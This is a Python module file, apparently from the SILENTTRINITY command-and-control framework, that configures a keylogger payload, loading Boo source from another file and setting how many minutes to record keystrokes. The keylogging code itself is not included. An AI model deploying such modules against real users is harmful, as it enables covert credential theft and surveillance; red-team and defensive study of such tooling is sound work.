from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/keylogger'
        self.language = 'boo'
        self.description = 'Grabs key strokes for x minutes'
        self.author = 'Devin Madewell'
        self.references = []
        self.options = {
            'Duration': {
                'Description'   :   'How long to log key strokes (in Minutes)',
                'Required'      :   True,
                'Value'         :   "2"
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/keylogger.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('MINUTES', self.options['Duration']['Value'])
            return src
